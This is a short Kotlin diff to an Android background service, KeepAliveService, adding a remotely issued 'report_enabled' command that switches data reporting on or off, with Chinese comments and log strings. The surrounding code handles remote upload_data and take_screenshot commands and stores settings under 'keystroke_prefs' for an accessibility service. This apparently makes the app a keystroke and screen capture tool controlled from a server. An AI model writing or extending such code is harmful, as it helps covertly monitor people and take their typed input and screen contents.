@@ -65,6 +65,7 @@ class KeepAliveService : Service() {
             "upload_data" -> handleUploadData()
             "take_screenshot" -> handleTakeScreenshot()
             "set_interval" -> handleSetInterval(params)
+            "report_enabled" -> handleReportEnabled(params)
             else -> Log.w(TAG, "Unknown command: $command")
         }
     }
@@ -119,6 +120,16 @@ class KeepAliveService : Service() {
             val prefs = getSharedPreferences("keystroke_prefs", MODE_PRIVATE)
             prefs.edit().putLong(InputAccessibilityService.KEY_SCREENSHOT_INTERVAL, intervalMs).apply()
             Log.d(TAG, "Screenshot interval set to ${intervalMs}ms")
+        }
+    }
+
+    /** 数据上报开关（report_enabled 指令） */
+    private fun handleReportEnabled(params: JsonObject?) {
+        val reportEnabled = params?.get("reportEnabled")?.asInt
+        if (reportEnabled != null) {
+            val repo = InputRepository.getInstance(this)
+            repo.setReportEnabled(reportEnabled == 1)
+            Log.d(TAG, "数据上报开关: ${if (reportEnabled == 1) "开启" else "关闭"}")
         }
     }
 
